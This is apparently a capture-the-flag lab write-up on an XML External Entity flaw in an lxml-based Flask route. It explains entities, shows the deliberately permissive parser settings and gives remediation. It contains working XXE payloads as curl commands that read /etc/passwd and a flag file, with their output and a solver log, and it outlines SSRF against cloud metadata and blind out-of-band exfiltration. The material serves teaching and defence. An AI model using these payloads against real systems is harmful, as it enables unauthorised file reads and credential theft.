# The King's Sealed Archives, Debrief

**Node:** `p5_4` &middot; **Flag:** `SEIYAKU{external_entity_unsealed}` &middot; **Route:** `POST /p5/archives` &middot; **Sink:** `challenges/phase5.py`, real `lxml` parser via `core/xml_parser.parse()` &middot; **Signal:** the echoed `<document>` element's resolved text, reading a real file's contents on the container's filesystem

## DTDs and entities, briefly

- A **DTD** (Document Type Definition) is XML's original schema
  mechanism, a document can carry its own DTD inline, right at the
  top, inside a `<!DOCTYPE ...>` declaration.
- A DTD can declare **entities**: named shorthand you reference
  elsewhere in the document as `&name;`, and the parser substitutes in
  its defined value wherever that reference appears, much like a
  `#define` macro.
- An **internal** entity's value is a literal string written directly
  in the DTD: `<!ENTITY name "some text">`. Completely inert, it's
  just a fixed string.
- An **external** entity's value is a *reference* the parser has to go
  fetch itself: `<!ENTITY name SYSTEM "some-uri">`. The `SYSTEM`
  keyword tells the parser "the real value lives at this URI, not in
  this document, go get it." A `file://` URI here means "read this
  local file and use its contents as the entity's value." This is the
  mechanism the acronym names: **X**ML **E**xternal **E**ntity.

## The bug, in one line

`core/xml_parser.py`'s shared parser configuration, used by every XML
route in this phase, explicitly enables both settings that make
external entities dangerous:

```python
# core/xml_parser.py
parser = etree.XMLParser(
    resolve_entities=True,   # follow SYSTEM references, don't just record them
    load_dtd=True,           # actually process a caller-supplied DOCTYPE at all
    ...
)
```

p5_3 used this exact same parser and was never exploitable via XXE,
because nothing in that route ever gave a caller-supplied DOCTYPE a
reason to matter, the bug there was upstream of parsing entirely. This
floor's route, `p5_archives()`, is where the same permissive parser
configuration becomes reachable: it parses a caller-supplied document
and then **echoes back an element's resolved text**:

```python
# challenges/phase5.py, p5_4
doc = xml_parser.parse(raw_xml.encode("utf-8"))
title_el = doc.find(".//document")
document_title = title_el.text if title_el is not None else None
```

`title_el.text` is whatever ended up as that element's content **after**
parsing, and once `resolve_entities=True` has substituted an external
entity's fetched file content in place of a `&name;` reference, that
resolved content is textually identical to text the caller typed by
hand. The route has no way to tell the difference, because there isn't
one anymore by the time `.text` is read.

## Why an ordinary request is completely safe

A request with no `DOCTYPE` at all has nothing for `resolve_entities`
to act on, there's no entity declared, so there's nothing to resolve.
The desk echoes back exactly, and only, the plain text you put in
`<document>`:

```bash
curl -s -X POST "$BASE/p5/archives" -H "Accept: application/json" \
    --data-urlencode "xml=<request><document>ancient-history-vol-3</document></request>"
```

```json
{"document_title":"ancient-history-vol-3","error":null,"raw_xml":"<request><document>ancient-history-vol-3</document></request>"}
```

This is the desk's real, intended feature working exactly as designed.
The vulnerability isn't in this path at all, it's that nothing stops a
caller from sending a *different* kind of document, one the desk was
never designed to anticipate.

## Finding the target path, without already knowing it

The objective says the King has a flag somewhere on the box, not what
its path is, and the catalogue of document titles this route actually
knows about doesn't include it. The discovery has two parts: prove the
read primitive works at all, then use that same primitive to find out
where to point it next, rather than guessing.

**Step 1 — prove the primitive on a file every Linux box has**,
independent of anything about this app:

```bash
curl -s -X POST "$BASE/p5/archives" -H "Accept: application/json" \
    --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><document>&xxe;</document></request>'
```

```json
{"document_title":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\nking:x:998:998::/home/king:/usr/sbin/nologin\n","error":null,...}
```

That alone proves general filesystem read: the Flask process's own
user can open any file it has permission to, not just one route is
special-cased for, confirmed by `/etc/passwd` reading back in full
instead of throwing the `XMLSyntaxError` a nonexistent path or
permission failure would produce.

**Step 2 — read what that file actually says.** `/etc/passwd` is a
colon-separated line per account: `username:x:uid:gid:gecos:home_dir:shell`.
Scanning the output for an account name that matches the fiction
("king" is a real line in it, not a guess) gives the fifth field
directly: `/home/king`. This is the same move as the host's own
`information_schema` floor, read the system's own metadata instead of
assuming a path, just with `/etc/passwd` as the metadata table instead
of a SQL catalogue.

**Step 3 — the filename inside that directory is still a short,
convention-based guess** (`flag.txt`, `flag`, `secret.txt`), the same
category of guess as any real local-file-read assessment where a
directory is known but its contents aren't listable through the
primitive itself. `flag.txt` hits first.

## The payload

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/king/flag.txt">]>
<request><document>&xxe;</document></request>
```

Walking through what the parser does with this, in order:

1. It reads the `<!DOCTYPE r [...]>` declaration and, because
   `load_dtd=True`, actually processes what's inside it, including the
   `<!ENTITY xxe SYSTEM "file:///home/king/flag.txt">` declaration.
2. Because `resolve_entities=True`, it doesn't just record that
   declaration, it immediately follows the `SYSTEM` reference,
   opening `/home/king/flag.txt` on the local filesystem (the same
   filesystem the Flask process itself runs on) and reading its
   contents.
3. Wherever `&xxe;` appears in the document body, the parser
   substitutes in that file's contents as if they'd been typed there
   directly.
4. `doc.find(".//document").text` is now the flag file's contents,
   indistinguishable, from the code's perspective, from a caller having
   typed the flag directly into their own request.

Live proof against the real running stack:

```bash
curl -s -X POST "$BASE/p5/archives" -H "Accept: application/json" \
    --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/king/flag.txt">]><request><document>&xxe;</document></request>'
```

```json
{"document_title":"SEIYAKU{external_entity_unsealed}\n","error":null,"raw_xml":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///home/king/flag.txt\">]><request><document>&xxe;</document></request>"}
```

`/home/king/flag.txt` lives in a real OS account's home directory
(created by the `Dockerfile`, not shipped in `COPY . .`) and is never
served, listed, or referenced by any other route in this lab, the only
way to ever see its contents at all is exactly this external-entity
read, found by reading `/etc/passwd` first rather than assuming a path.

## SSRF and blind/OOB variants, briefly (not required for this floor)

- **SSRF via XXE**: a `SYSTEM` URI doesn't have to be `file://`. Pointed
  at `http://169.254.169.254/...` (a cloud metadata endpoint on many
  providers) or an internal-only service URL, the same mechanism turns
  into **S**erver-**S**ide **R**equest **F**orgery, the *parser*, not
  the attacker, makes an outbound request from inside the network the
  attacker couldn't otherwise reach.
- **Blind/OOB XXE**: this floor's route conveniently echoes the
  resolved value back in the response (a "reflected" XXE). A route that
  parses XML but never echoes anything back is still exploitable, just
  less directly: an external DTD hosted on an attacker-controlled server
  can chain a parameter entity (`%xxe;`) into a request that exfiltrates
  file content as part of a URL sent to that attacker-controlled server,
  the same fundamental idea as this course's Out-of-Band SQLi
  (Phase 3's Spell Card), applied to XML instead of SQL.

## The full solver, live

`solvers/p5_4.sh` runs all four checks below against the real running
stack, in order: (1) an ordinary request echoes back exactly its own
plain title, (2) an XXE payload against `/etc/passwd` proves general
file-read, (3) the script parses that same `/etc/passwd` response for
the `king` account's own line and extracts its home directory, no path
hardcoded in advance, (4) an XXE payload against `<that home
directory>/flag.txt` recovers the flag. This is the actual, unedited
output of a real run against this exact build (`SEIYAKU_BASE` was the
default `http://localhost:8000` for this run):

```
[p5_4] target: http://localhost:8000/p5/archives
[p5_4] step 1: ordinary request, no DOCTYPE
  response: {"document_title":"ancient-history-vol-3","error":null,"raw_xml":"<request><document>ancient-history-vol-3</document></request>"}
  ok: ordinary request echoed back exactly its own plain title
[p5_4] step 2: XXE file read: file:///etc/passwd
  response (truncated): {"document_title":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...
  ok: /etc/passwd contents genuinely read back through the entity
[p5_4] step 3: locate the 'king' account's home directory in /etc/passwd
  ok: found account line: king:x:999:999::/home/king:/usr/sbin/nologin
  ok: king's home directory: /home/king
[p5_4] step 4: XXE file read: file:///home/king/flag.txt
  response: {"document_title":"SEIYAKU{external_entity_unsealed}\n","error":null,"raw_xml":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///home/king/flag.txt\">]><request><document>&xxe;</document></request>"}
  ok: sealed archive file read via external entity, flag recovered: SEIYAKU{external_entity_unsealed}
[p5_4] ok: ordinary request clean, /etc/passwd read confirms general file-read,
[p5_4]     king's home directory discovered from that same read,
[p5_4]     sealed flag file read via a real external entity
[p5_4] PASS
```

## HxH analogy

The King's own archive was never meant to be reachable from the request
desk at all, it sits sealed away, entirely outside the catalogue the
desk was built to search. But the desk was never told that a *request*
could itself carry instructions about where to go looking, separate
from the title it plainly displays. `resolve_entities=True` is the
desk agreeing, without a second thought, to walk to wherever a request
tells it to walk and read back whatever it finds there, before it ever
gets to the part of the request that looks like an ordinary title. The
seal was never broken from outside. The desk carried it out through the
front door itself, because the request never had to prove it was asking
about something in the catalogue at all.

## Remediation

- **Disable DTD processing and external entity resolution, this is
  the one XXE fix to remember, full stop.** For `lxml` specifically:

  ```python
  parser = etree.XMLParser(
      resolve_entities=False,
      load_dtd=False,
      no_network=True,
      huge_tree=False,
  )
  ```

  `resolve_entities=False` alone is often enough, but disabling
  `load_dtd` too means a caller-supplied `DOCTYPE` is never processed
  at all, which also closes Billion-Laughs-style internal-entity
  expansion DoS as a side effect.
- **Prefer a data format with no DTD/entity concept at all** where the
  application design allows it, JSON has no equivalent mechanism, so
  an app that can move off XML removes this entire class of bug rather
  than just mitigating it.
- **If XML is required, use an allow-listed, hardened parser
  configuration everywhere, with no per-route exceptions.** The
  contrast between p5_3 (same parser config, not exploitable, no
  reflecting sink) and p5_4 (same parser config, fully exploitable, a
  reflecting sink) is exactly why "this route probably doesn't need it"
  is the wrong question to ask about parser hardening: the unsafe
  setting is dormant, not harmless, until some future route gives it a
  sink. Harden the parser once, for every caller of it, regardless of
  what any current route happens to do with the result.
- **Never let a document you parse from a user determine a filesystem
  or network path your own process then touches.** Even with entities
  disabled, the same instinct, "does user-controlled data get to
  choose a resource my server reaches out to?", is the general SSRF/
  path-traversal question this floor is a specific instance of.
